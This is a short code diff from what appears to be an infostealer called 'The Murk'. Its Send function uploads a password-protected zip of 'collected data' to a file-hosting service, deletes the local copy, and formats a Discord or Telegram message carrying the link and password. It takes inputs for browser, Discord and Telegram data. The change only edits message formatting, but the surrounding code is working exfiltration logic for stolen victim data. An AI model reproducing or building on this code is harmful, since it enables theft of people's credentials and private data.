@@ -39,7 +39,6 @@ def Send(type,np,data,dataB,dataO,dataW,dataF,dataV,discordData,TelegramData,xmp
 	try:
 		url = upload_file_to_gofile(rf'{np[0]}.zip')
 		print(url)
-		
 		try:
 			remove(f'{np[0]}.zip')
 		except Exception as e:
@@ -50,7 +49,7 @@ def Send(type,np,data,dataB,dataO,dataW,dataF,dataV,discordData,TelegramData,xmp
 			if type == 0:
 				title = f"**:regional_indicator_t: :regional_indicator_h: :regional_indicator_e:  :regional_indicator_m: :regional_indicator_u: :regional_indicator_r: :regional_indicator_k:  :regional_indicator_r: :regional_indicator_e: :regional_indicator_s: :regional_indicator_u: :regional_indicator_l: :regional_indicator_t: :regional_indicator_s: **\n\n[🔗Link]({url})\n📜Password: ||{np[1]}||\n\n**⇓Collected data⇓**"
 			if type == 1 or type == 2:
-				title = f"<b>🛑hey bro, see The Murk results🛑</b>\n🔗Link:{url}\n📜Password: {np[1]}\n\n<b>⇓Collected data⇓</b>"			
+				title = f"🛑hey bro, see The Murk results🛑\n🔗Link:{url}\n📜Password: {np[1]}\n\n⇓Collected data⇓"			
 			message += f"{title}"
 			try:
 				message += data
